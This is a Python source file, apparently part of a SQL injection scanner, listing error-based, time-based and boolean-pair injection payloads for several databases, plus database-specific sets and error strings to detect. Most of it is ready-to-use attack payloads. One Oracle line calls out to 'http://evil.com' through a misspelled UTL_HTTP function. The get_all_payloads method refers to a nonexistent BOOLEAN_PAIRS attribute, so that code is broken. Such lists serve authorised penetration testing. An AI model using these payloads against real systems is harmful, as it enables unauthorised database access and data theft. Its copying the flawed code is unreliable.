class SqliPayloads:
    """Collection of comprehensive SQL injection payloads"""
    
    # ERROR-BASED SQL INJECTION PAYLOADS (Simplified but effective)
    ERROR_BASED = [
        "'",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR (1=1)--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=1/0--",
        "' OR (SELECT COUNT(*) FROM sysobjects)>0--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND 1=CAST((SELECT @@version) AS INT)--",
        "' AND 1=CAST((SELECT DATABASE()) AS SIGNED)--",
        "' AND 1=CAST((SELECT USER()) AS SIGNED)--",
        "' AND (SELECT 1/0 FROM dual)--",
        "' AND 1=CONVERT(INT,(SELECT COUNT(*) FROM sys.objects))--"
    ]
    
    # TIME-BASED SQL INJECTION PAYLOADS
    TIME_BASED = [
        # MySQL time-based payloads
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL) OR 'vRxe'='vRxe",
        "') AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND ('vRxe'='vRxe",
        "' UNION SELECT SLEEP(5)--",
        "' OR SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' OR IF(1=1,SLEEP(5),0)--",
        
        # PostgreSQL time-based payloads
        "' AND pg_sleep(5)--",
        "' OR pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
        "') AND pg_sleep(5)--",
        
        # SQL Server time-based payloads
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND WAITFOR DELAY '0:0:5'--",
        "' OR WAITFOR DELAY '0:0:5'--",
        "'); WAITFOR DELAY '0:0:5'--"
    ]
    
    # BOOLEAN-BASED SQL INJECTION PAYLOADS (TRUE/FALSE PAIRS) - FIXED STRUCTURE
    BOOLEAN_BASED = [
        # Basic true/false conditions
        ("' AND 1=1--", "' AND 1=2--"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("') AND (1=1)--", "') AND (1=2)--"),
        ("') OR (1=1)--", "') OR (1=2)--"),
        
        # String-based true/false conditions
        ("' AND 'a'='a'--", "' AND 'a'='b'--"),
        ("' OR 'x'='x'--", "' OR 'x'='y'--"),
        ("') AND ('test'='test')--", "') AND ('test'='fake')--"),
        
        # Numeric comparisons
        ("' AND 5>4--", "' AND 5<4--"),
        ("' AND 10=10--", "' AND 10=11--"),
        ("') AND (100>99)--", "') AND (100<99)--"),
        
        # Length-based conditions
        ("' AND LENGTH('test')=4--", "' AND LENGTH('test')=5--"),
        ("' AND LEN('test')=4--", "' AND LEN('test')=5--"),
        
        # Substring conditions
        ("' AND SUBSTRING('admin',1,1)='a'--", "' AND SUBSTRING('admin',1,1)='b'--"),
        ("' AND SUBSTR('test',1,1)='t'--", "' AND SUBSTR('test',1,1)='x'--"),
        
        # Case-sensitive conditions
        ("' AND 'Admin'='Admin'--", "' AND 'Admin'='admin'--"),
        
        # Mathematical conditions
        ("' AND 2*2=4--", "' AND 2*2=5--"),
        ("' AND MOD(5,2)=1--", "' AND MOD(5,2)=0--")
    ]
    
    @classmethod
    def get_all_payloads(cls):
        """Get all SQL injection payloads"""
        all_boolean = [item for pair in cls.BOOLEAN_PAIRS for item in pair]
        return cls.ERROR_BASED + cls.TIME_BASED + all_boolean
    
    @classmethod
    def get_error_indicators(cls):
        """Get SQL error indicators to look for in responses"""
        return [
            # MySQL errors
            "sql syntax",
            "mysql_fetch",
            "warning: mysql",
            "valid mysql result",
            "you have an error in your sql syntax",
            "mysql error",
            "warning: division by zero",
            "function.mysql",
            "mysql result",
            "mysql_num_rows",
            
            # PostgreSQL errors
            "postgresql query failed",
            "warning: postgresql",
            "warning: pg_",
            "invalid query",
            "postgresql error",
            
            # SQL Server errors
            "microsoft ole db provider for odbc drivers",
            "microsoft ole db provider for sql server",
            "incorrect syntax near",
            "unclosed quotation mark after the character string",
            "microsoft jet database engine",
            "odbc sql server driver",
            
            # Oracle errors
            "oci_parse",
            "ora-01756",
            "ora-00921",
            "ora-00936",
            "oracle error",
            "oracle driver",
            
            # SQLite errors
            "sqlite_exec",
            "sqlite error",
            "warning: sqlite",
            
            # Generic SQL errors
            "syntax error",
            "database error",
            "sql error",
            "query failed",
            "invalid sql",
            "sql statement",
            "quoted string not properly terminated",
            "uncategorized sqlexception",
            "java.sql.sqlexception",
            "org.springframework.jdbc"
        ]
    
    @classmethod
    def get_database_specific_payloads(cls, db_type):
        """Get database-specific payloads"""
        if db_type.lower() == 'mysql':
            return [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
                "' UNION SELECT SLEEP(5),@@version--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--"
            ]
        elif db_type.lower() == 'postgresql':
            return [
                "' AND pg_sleep(5)--",
                "' UNION SELECT pg_sleep(5),version()--",
                "' AND CAST(version() AS numeric)--"
            ]
        elif db_type.lower() == 'mssql':
            return [
                "'; WAITFOR DELAY '0:0:5'--",
                "' UNION SELECT @@version,SYSTEM_USER--",
                "' AND 1=CONVERT(int,@@version)--"
            ]
        elif db_type.lower() == 'oracle':
            return [
                "' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)>0--",
                "' UNION SELECT banner,NULL FROM v$version--",
                "' AND 1=UTLHTTP.REQUEST('http://evil.com')--"
            ]
        else:
            return cls.ERROR_BASED[:5]
